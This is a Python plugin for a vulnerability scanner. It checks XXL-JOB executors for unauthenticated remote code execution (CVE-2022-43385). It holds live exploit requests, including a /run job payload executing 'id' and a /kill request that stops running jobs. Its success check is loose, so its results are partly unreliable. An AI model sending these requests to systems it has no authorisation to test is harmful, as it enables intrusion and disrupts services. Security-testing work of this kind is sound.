from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("xxljob_rce")


@register_scanner
class XXLJobRCEScanner(BaseScanner):
    name = "XXL-JOB 未授权RCE"
    description = "XXL-JOB执行器API未授权访问导致远程代码执行"
    category = "xxljob"
    module = "xxljob_rce"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-43385"]
    references = [
        "https://github.com/xuxueli/xxl-job/issues/3100",
    ]
    fix_suggestion = "配置xxl.job.accessToken，限制执行器端口外网访问"

    DETECT_PATHS = [
        "/",
        "/api/",
        "/run",
        "/beat",
        "/idleBeat",
        "/log",
    ]

    EXPLOIT_PATHS = [
        {
            "name": "XXL-JOB 执行器未授权命令执行",
            "path": "/run",
            "method": "POST",
            "data": '{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"id","logId":1,"logDateTime":1,"glueType":"BEAN","glueSource":"","broadcastIndex":0,"broadcastTotal":1}',
            "marker": "code",
            "risk_score": 10,
        },
        {
            "name": "XXL-JOB 心跳检测未授权",
            "path": "/beat",
            "method": "POST",
            "data": '{}',
            "marker": "code",
            "risk_score": 7,
        },
        {
            "name": "XXL-JOB 空闲检测未授权",
            "path": "/idleBeat",
            "method": "POST",
            "data": '{"jobId":1}',
            "marker": "code",
            "risk_score": 7,
        },
        {
            "name": "XXL-JOB 日志读取未授权",
            "path": "/log",
            "method": "POST",
            "data": '{"logDateTim":1,"logId":1,"fromLineNum":1}',
            "marker": "code",
            "risk_score": 6,
        },
        {
            "name": "XXL-JOB kill任务未授权",
            "path": "/kill",
            "method": "POST",
            "data": '{"jobId":1}',
            "marker": "code",
            "risk_score": 8,
        },
    ]

    def _detect_xxljob(self) -> bool:
        for path in ["/", "/api/"]:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue
            if "xxl-job" in resp.text.lower() or "xxljob" in resp.text.lower():
                return True
            try:
                data = resp.json()
                if "xxl" in str(data).lower() or "code" in data:
                    return True
            except Exception:
                pass

        beat_url = f"{self.target}/beat"
        resp = http_request("POST", beat_url, data="{}")
        if resp:
            try:
                data = resp.json()
                if "code" in data:
                    return True
            except Exception:
                pass
        return False

    def check(self) -> bool:
        is_xxljob = self._detect_xxljob()
        if not is_xxljob:
            return False

        self.add_result(
            name="XXL-JOB 执行器检测",
            risk_level="info",
            risk_score=0,
            target_url=self.target,
            detail="检测到XXL-JOB执行器服务",
            evidence="响应中包含XXL-JOB特征标识",
        )

        found = False
        for payload in self.EXPLOIT_PATHS:
            url = f"{self.target}{payload['path']}"
            headers = {"Content-Type": "application/json"}
            data = payload.get("data", "{}")

            resp = http_request(payload["method"], url, data=data, headers=headers)
            if resp is None:
                continue

            marker = payload.get("marker", "")
            if marker and marker in resp.text:
                try:
                    rjson = resp.json()
                    if rjson.get("code") == 200 or "code" in rjson:
                        risk = "critical" if payload["risk_score"] >= 9 else "high"
                        self.add_result(
                            name=payload["name"],
                            risk_level=risk,
                            risk_score=payload["risk_score"],
                            target_url=url,
                            detail=f"确认漏洞: {payload['name']}",
                            payload=data,
                            response_snippet=resp.text[:500],
                            evidence=f"API返回成功响应: {resp.text[:200]}",
                        )
                        found = True
                except Exception:
                    pass

        return found
